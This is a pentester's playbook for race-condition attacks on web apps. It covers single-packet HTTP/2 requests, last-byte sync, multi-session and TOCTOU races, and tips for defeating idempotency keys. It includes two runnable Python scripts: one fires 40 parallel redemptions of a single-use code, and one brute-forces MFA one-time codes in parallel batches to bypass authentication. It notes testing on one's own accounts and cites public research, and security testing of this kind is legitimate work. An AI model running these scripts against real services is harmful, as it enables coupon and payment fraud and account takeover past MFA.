# Race conditions — playbook

## when to try
- Anything with **single-use semantics**: discount codes, MFA codes, password
  resets, gift cards, account-creation by email.
- **Limits**: "only one withdrawal per day", "max 3 invites", "one rating per user".
- **State transitions** that should be one-way: confirm-email, accept-invitation,
  refund/return, cancel-and-refund.

## the modern technique: HTTP/2 single-packet attack
Defeats most classic-mitigations (per-request locks, mutex on user_id) by
collapsing 20–50 requests into one TCP packet — server processes them in
parallel before any of them finishes.

Use Burp's *Repeater → Send group in parallel (single connection)* (Turbo Intruder
"race-single-packet" template), or `h2c-rs` / `h2spec` / a Python `httpx[http2]` script:

```python
import asyncio, httpx
async def fire(c, body):
    return await c.post("https://t/api/redeem",
        json=body, headers={"Cookie":"session=..."})
async def main():
    async with httpx.AsyncClient(http2=True, verify=False) as c:
        # warm the connection
        await c.get("https://t/")
        tasks = [fire(c, {"code":"ONESHOT"}) for _ in range(40)]
        rs = await asyncio.gather(*tasks)
        for r in rs:
            print(r.status_code, r.text[:80])
asyncio.run(main())
```

## key tricks
- **Last-byte sync**: send 39 of 40 requests up to their last byte, then send the final byte for all 40 simultaneously. Built into Turbo Intruder; manually replicable with raw sockets.
- **Multi-step sequences**: `request A → request B`. If B depends on A's side-effect, race A. Send 20× A, observe whether B succeeds 20× or 1×.
- **Session-isolated races**: some apps lock per-session — race using **different sessions** (multiple test accounts) hitting the same shared resource (one promo code).
- **Time-of-check vs time-of-use**: e.g. `if balance >= amount: deduct(amount)` — race the deduct to drain twice.

## confirmation flow
1. Find a single-use action. Verify normal behavior: 1 success, second attempt = 4xx/"already used".
2. Reset state (new code, new account).
3. Fire 30–50 parallel via single-packet. Check responses.
4. **Confirm**: more successes than expected (≥ 2). If yes, capture full request set, repeat to ensure not a one-off.

## exploitation snippet (auth-bypass class)
```python
# Brute-force MFA OTP race — attempt 10000 OTPs in groups of 50 single-packet
import asyncio, httpx
SES = {"Cookie":"session=...mid-mfa..."}
async def attempt(c, otp):
    r = await c.post("https://t/mfa/verify", json={"otp":otp}, headers=SES)
    return r.status_code, otp
async def main():
    async with httpx.AsyncClient(http2=True, verify=False, timeout=30) as c:
        for batch_start in range(0, 10000, 50):
            tasks = [attempt(c, f"{i:06d}") for i in range(batch_start, batch_start+50)]
            for s, otp in await asyncio.gather(*tasks):
                if s == 200: print("HIT", otp); return
asyncio.run(main())
```

## caveats
- Successful race on a real target may **double-charge a real user's card** if the resource is shared. Use only your own test accounts and small amounts.
- Some apps mitigate with idempotency-keys: re-using the same key returns the cached response — defeats race. Try varying or omitting the key.
- HTTP/1.1-only servers can't be raced via single-packet; fall back to many-connections concurrency (less reliable, more noise).

## provenance
- James Kettle / PortSwigger "Smashing the state machine" (2023) — single-packet attack.
- PortSwigger Race Conditions lab family.
- Public: HackerOne $25k race on coupon redemption (2023), Booking.com referral abuse.
